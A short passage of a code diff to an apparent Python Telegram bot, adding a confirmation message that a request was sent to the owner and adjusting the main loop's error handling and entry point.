+                        send_telegram_message(chat_id, "✅ Request sent to owner!")
+                        continue
             
             time.sleep(0.5)
             
@@ -748,6 +798,6 @@ def main():
             print(f"Error: {e}")
             time.sleep(5)
 
-
 if __name__ == "__main__":
     main()
+
